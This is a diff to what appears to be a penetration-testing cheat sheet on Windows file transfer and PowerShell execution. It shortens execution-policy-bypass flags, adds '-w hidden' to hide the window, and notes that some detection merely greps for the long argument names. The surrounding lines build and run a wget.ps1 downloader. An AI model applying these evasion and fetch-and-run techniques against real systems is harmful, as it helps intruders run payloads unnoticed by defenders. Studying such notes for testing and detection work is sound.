@@ -27,13 +27,15 @@ xcopy /c /h /r /s /y <source> <smb destination>
 ## PowerShell
 Running PowerShell commands/files
 ```powershell
-powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -Command <command>
-powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File <file>
+powershell -ep bypass -nol -noni -nop -Command <command>
+powershell -ep bypass -nol -noni -nop -File <file>
 ```
-- `-ExecutionPolicy` sets the default execution policy for the current session, but does not override the value set in the registry
-- `-NoLogo` hides the copyright banner at startup
-- `-NonInteractive` does not present an interactive prompt to the user
-- `-NoProfile` does not load the Windows PowerShell profile
+- `-ep` sets the default execution policy for the current session, but does not override the value set in the registry
+- `-nol` hides the copyright banner at startup
+- `-noni` does not present an interactive prompt to the user
+- `-nop` does not load the Windows PowerShell profile
+- Can additionally add `-w hidden` to hide the window
+- Note; some detection just greps for these args
 
 Paste into terminal to create `wget.ps1` script
 ```powershell
@@ -45,7 +47,7 @@ echo $webclient.DownloadFile($url,$file) >> wget.ps1
 ```
 
 ```powershell
-powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+powershell -ep bypass -nol -noni -nop wget.ps1
 ```
 
 One-liners (first is same as above pasted script)
